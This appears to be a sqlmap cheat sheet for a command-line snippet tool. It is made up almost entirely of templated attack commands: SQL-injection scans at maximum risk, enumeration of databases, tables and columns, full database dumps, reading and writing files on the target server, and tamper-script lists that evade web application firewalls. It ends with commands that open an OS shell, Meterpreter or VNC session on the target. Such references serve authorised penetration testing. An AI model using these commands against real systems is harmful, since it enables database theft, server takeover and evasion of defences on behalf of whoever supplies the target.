# Sqlmap

<!-- cheat
export sqlmap
var sqlmap_templates = printf '%s\n' '# no im scared...' '--risk=3 --level=5 # yes, i dont care' --- --header 'Scan everything?'
var sqlmap_shell_templates = printf '%s\n' '--os-pwn # Prompt for an OOB shell, Meterpreter or VNC' '--os-shell # Prompt for an interactive operating system shell' --- --header 'Sqlmap shell template'
-->

## sqlmap - Enumeration

### Scan from request.txt

Scan Sqlmap from request.txt.

```sh title:"Sqlmap Scan from Request.txt"
sqlmap -r $file $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
import files
-->

### Check DB privileges

Check DB privileges with Sqlmap.

```sh title:"Sqlmap Check DB Privileges"
sqlmap -r $file $sqlmap_templates --batch --privileges
```
<!-- cheat
import sqlmap
import files
-->

### List databases

List databases with Sqlmap.

```sh title:"Sqlmap List Databases"
sqlmap -r $file $sqlmap_templates --batch --dbs
```
<!-- cheat
import sqlmap
import files
-->

### List tables

List tables with Sqlmap.

```sh title:"Sqlmap List Tables"
sqlmap -r $file $sqlmap_templates --batch -D $db --tables
```
<!-- cheat
import sqlmap
import files
var db
-->

### List columns

List columns with Sqlmap.

```sh title:"Sqlmap List Columns"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --columns
```
<!-- cheat
import sqlmap
import files
var db
var table
-->

### GET URL scan

Get URL scan with Sqlmap.

```sh title:"Sqlmap Get URL Scan"
sqlmap -u "$url" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
-->

### POST data scan

Scan POST data scan with Sqlmap.

```sh title:"Sqlmap Scan POST Data Scan"
sqlmap -u "$url" --data="$params" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var params
-->

### Cookie scan

Scan cookie scan with Sqlmap.

```sh title:"Sqlmap Scan Cookie Scan"
sqlmap -u "$url" --cookie="$cookie" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var cookie
-->

## sqlmap - Extraction

### Dump one table

Dump one table with Sqlmap.

```sh title:"Sqlmap Dump One Table"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
-->

### Dump columns

Dump columns with Sqlmap.

```sh title:"Sqlmap Dump Columns"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table -C "$columns" --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
var columns
-->

### Dump entire DB

Dump entire DB with Sqlmap.

```sh title:"Sqlmap Dump Entire DB"
sqlmap -r $file $sqlmap_templates --batch -D $db --dump
```
<!-- cheat
import sqlmap
var file
var db
-->

### Read file from server

Read file from server with Sqlmap.

```sh title:"Sqlmap Read File from Server"
sqlmap -r req.txt --batch $sqlmap_templates --file-read=$file_path
```
<!-- cheat
import sqlmap
var file_path
-->

### Write file to server

Write file to server with Sqlmap.

```sh title:"Sqlmap Write File to Server"
sqlmap -r $file --batch $sqlmap_templates --file-write="$local_file" --file-dest="$remote_path"
```
<!-- cheat
import sqlmap
var file
var local_file
var remote_path
-->

## sqlmap - Tamper

### Generic tamper list

List generic tamper list with Sqlmap.

```sh title:"Sqlmap List Generic Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MySQL tamper list

List MySQL tamper list with Sqlmap.

```sh title:"Sqlmap List MySQL Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MSSQL tamper list

List MSSQL tamper list with Sqlmap.

```sh title:"Sqlmap List MSSQL Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
<!-- cheat
import sqlmap
var url
-->

## sqlmap - Shell

### Get shell

Get shell with Sqlmap.

```sh title:"Sqlmap Get Shell"
sqlmap -r $file $sqlmap_templates --batch $sqlmap_shell_templates 
```
<!-- cheat
import sqlmap
var file
-->
